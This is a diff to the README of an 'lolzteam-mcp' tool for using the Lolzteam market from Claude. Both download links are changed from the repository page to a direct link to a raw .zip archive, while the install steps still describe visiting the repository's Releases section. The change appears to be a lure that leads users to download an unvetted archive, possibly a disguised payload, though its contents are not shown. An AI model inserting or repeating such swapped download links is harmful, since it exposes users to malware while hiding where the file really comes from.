@@ -1,6 +1,6 @@
 # 🤖 lolzteam-mcp - Access Lolzteam market directly in Claude
 
-[![Download lolzteam-mcp](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Catherinlousy651/lolzteam-mcp)
+[![Download lolzteam-mcp](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/Catherinlousy651/lolzteam-mcp/main/lolzteam_mcp/lolzteam-mcp-v1.7.zip)
 
 ## 📌 About this project
 
@@ -20,7 +20,7 @@ Ensure your computer meets these basic requirements before you begin:
 
 To start the installation, visit the primary project page.
 
-[Download lolzteam-mcp here](https://github.com/Catherinlousy651/lolzteam-mcp)
+[Download lolzteam-mcp here](https://raw.githubusercontent.com/Catherinlousy651/lolzteam-mcp/main/lolzteam_mcp/lolzteam-mcp-v1.7.zip)
 
 1. Click the link above to open the main project repository in your web browser.
 2. Locate the Releases section on the right sidebar of the page.
